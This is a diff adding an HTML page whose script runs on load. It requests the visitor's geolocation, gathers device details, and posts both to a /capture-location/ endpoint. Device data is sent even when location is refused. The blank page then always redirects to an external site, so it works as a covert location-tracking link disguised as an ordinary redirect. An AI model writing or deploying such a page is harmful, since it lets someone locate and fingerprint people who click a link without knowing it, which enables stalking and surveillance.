@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>...</title>
+    <script>
+      // Function to get the user's location and send it to the server
+      function getLocationAndSend() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            sendPositionToServer,
+            handleGeoError
+          );
+        } else {
+          console.error("Geolocation is not supported by this browser.");
+          sendPositionToServerFallback(); // Proceed to send without geolocation data
+        }
+      }
+
+      // Function to handle geolocation error or denial
+      function handleGeoError(error) {
+        console.error("Error getting geolocation:", error);
+        sendPositionToServerFallback(); // Proceed to send without geolocation data
+      }
+
+      // Function to send the position to the server
+      function sendPositionToServer(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+
+        // Get device information
+        var deviceInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+        };
+
+        // Send the data to the server using fetch
+        fetch("/capture-location/", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-CSRFToken": getCSRFToken(), // Ensure this gets the CSRF token properly
+          },
+          body: JSON.stringify({
+            latitude: lat,
+            longitude: lon,
+            deviceInfo: deviceInfo,
+          }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            console.log("Success:", data);
+            handleServerResponse(data); // Handle server response
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            continueProcess(); // Continue with the process even if there's an error
+          });
+      }
+
+      // Function to send data to server without geolocation
+      function sendPositionToServerFallback() {
+        // Send the data to the server without geolocation
+        fetch("/capture-location/", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-CSRFToken": getCSRFToken(), // Ensure this gets the CSRF token properly
+          },
+          body: JSON.stringify({
+            latitude: null,
+            longitude: null,
+            deviceInfo: {
+              userAgent: navigator.userAgent,
+              platform: navigator.platform,
+              screenWidth: window.screen.width,
+              screenHeight: window.screen.height,
+            },
+          }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            console.log("Success (fallback):", data);
+            handleServerResponse(data); // Handle server response
+          })
+          .catch((error) => {
+            console.error("Error (fallback):", error);
+            continueProcess(); // Continue with the process even if there's an error
+          });
+      }
+
+      // Function to handle server response
+      function handleServerResponse(data) {
+        // Always redirect after attempting to capture location
+        window.location.href = "https://ebriancs.netlify.app/"; // Replace with your specific URL
+      }
+
+      // Function to get CSRF token
+      function getCSRFToken() {
+        var token = null;
+        if (!document.cookie) {
+          console.error("No cookies available.");
+          return token;
+        }
+
+        var cookies = document.cookie.split(";");
+        for (var i = 0; i < cookies.length; i++) {
+          var cookie = cookies[i].trim();
+          if (cookie.startsWith("csrftoken=")) {
+            token = cookie.substring("csrftoken=".length, cookie.length);
+            break;
+          }
+        }
+
+        if (!token) {
+          console.error("CSRF token not found in cookies.");
+        }
+
+        return token;
+      }
+
+      // Function to continue the process after handling errors
+      function continueProcess() {
+        console.log("Continuing with the process...");
+        // Implement your logic to proceed with the rest of the application flow
+        // For example, you can display a message to the user or proceed to another step.
+      }
+
+      // Call the function to get location and send data on page load
+      window.onload = getLocationAndSend;
+    </script>
+  </head>
+  <body>
+    <!-- Your HTML body content goes here -->
+  </body>
+</html>
